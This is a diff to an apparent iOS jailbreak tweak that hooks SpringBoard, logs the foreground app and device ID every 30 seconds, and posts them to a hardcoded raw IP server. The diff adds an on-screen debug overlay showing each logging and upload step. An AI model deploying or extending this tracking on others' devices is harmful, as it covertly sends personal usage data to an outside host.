@@ -6,6 +6,8 @@
 static NSString *API_ENDPOINT = @"http://186.190.215.38:3000/screenshots/log";
 static NSString *DEVICE_ID = nil;
 static NSMutableArray *systemLogs = nil;
+static UIWindow *debugWindow = nil;
+static UITextView *debugTextView = nil;
 
 // Declare interfaces
 @interface SBApplication : NSObject
@@ -21,6 +23,7 @@ static NSMutableArray *systemLogs = nil;
 - (void)logSystemActivity;
 - (void)sendLogsToServer;
 - (NSString *)getCurrentApp;
+- (void)updateDebugWindow:(NSString *)message;
 @end
 
 %hook SpringBoard
@@ -38,8 +41,28 @@ static NSMutableArray *systemLogs = nil;
         DEVICE_ID = [[[UIDevice currentDevice] identifierForVendor] UUIDString];
     }
     
+    // Create debug window
+    dispatch_async(dispatch_get_main_queue(), ^{
+        debugWindow = [[UIWindow alloc] initWithFrame:CGRectMake(0, 0, 300, 200)];
+        debugWindow.windowLevel = UIWindowLevelStatusBar + 1;
+        debugWindow.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.8];
+        debugWindow.layer.cornerRadius = 10;
+        
+        debugTextView = [[UITextView alloc] initWithFrame:CGRectMake(10, 10, 280, 180)];
+        debugTextView.backgroundColor = [UIColor clearColor];
+        debugTextView.textColor = [UIColor whiteColor];
+        debugTextView.font = [UIFont systemFontOfSize:12];
+        debugTextView.editable = NO;
+        debugTextView.selectable = NO;
+        
+        [debugWindow addSubview:debugTextView];
+        debugWindow.hidden = NO;
+        
+        [self updateDebugWindow:@"Debug window initialized"];
+    });
+    
     // Single timer for both logging and sending (every 60 seconds)
-    [NSTimer scheduledTimerWithTimeInterval:60.0
+    [NSTimer scheduledTimerWithTimeInterval:30.0
                                    target:self
                                  selector:@selector(logSystemActivity)
                                  userInfo:nil
@@ -62,6 +85,27 @@ static NSMutableArray *systemLogs = nil;
 }
 
 %new
+-(void)updateDebugWindow:(NSString *)message {
+    dispatch_async(dispatch_get_main_queue(), ^{
+        if (!debugTextView) return;
+        
+        NSDateFormatter *formatter = [[NSDateFormatter alloc] init];
+        [formatter setDateFormat:@"HH:mm:ss"];
+        NSString *timestamp = [formatter stringFromDate:[NSDate date]];
+        
+        NSString *newMessage = [NSString stringWithFormat:@"[%@] %@\n", timestamp, message];
+        debugTextView.text = [newMessage stringByAppendingString:debugTextView.text];
+        
+        // Keep only last 10 messages
+        NSArray *lines = [debugTextView.text componentsSeparatedByString:@"\n"];
+        if (lines.count > 10) {
+            NSArray *recentLines = [lines subarrayWithRange:NSMakeRange(0, 10)];
+            debugTextView.text = [recentLines componentsJoinedByString:@"\n"];
+        }
+    });
+}
+
+%new
 -(void)logSystemActivity {
     @try {
         // Get current app
@@ -77,12 +121,13 @@ static NSMutableArray *systemLogs = nil;
         // Add to logs array and send immediately
         [systemLogs addObject:logEntry];
         
+        // Update debug window
+        [self updateDebugWindow:[NSString stringWithFormat:@"App logged: %@", currentApp]];
+        
         // Send logs if we have any
         [self sendLogsToServer];
-        
-        NSLog(@"[SystemMonitor] App logged: %@", currentApp);
     } @catch (NSException *exception) {
-        NSLog(@"[SystemMonitor] Error logging activity: %@", exception);
+        [self updateDebugWindow:[NSString stringWithFormat:@"Error logging: %@", exception]];
     }
 }
 
@@ -101,16 +146,21 @@ static NSMutableArray *systemLogs = nil;
         [request setValue:@"text/plain" forHTTPHeaderField:@"Content-Type"];
         [request setHTTPBody:[payload dataUsingEncoding:NSUTF8StringEncoding]];
         
+        // Update debug window
+        [self updateDebugWindow:@"Sending logs to server..."];
+        
         // Send request
         [[[NSURLSession sharedSession] dataTaskWithRequest:request 
                                        completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
             if (!error && [(NSHTTPURLResponse *)response statusCode] == 200) {
                 [systemLogs removeAllObjects];
-                NSLog(@"[SystemMonitor] Logs sent successfully");
+                [self updateDebugWindow:@"Logs sent successfully"];
+            } else {
+                [self updateDebugWindow:[NSString stringWithFormat:@"Failed to send logs: %@", error ? error.localizedDescription : @"Unknown error"]];
             }
         }] resume];
     } @catch (NSException *exception) {
-        NSLog(@"[SystemMonitor] Error sending logs: %@", exception);
+        [self updateDebugWindow:[NSString stringWithFormat:@"Error sending logs: %@", exception]];
     }
 }
 
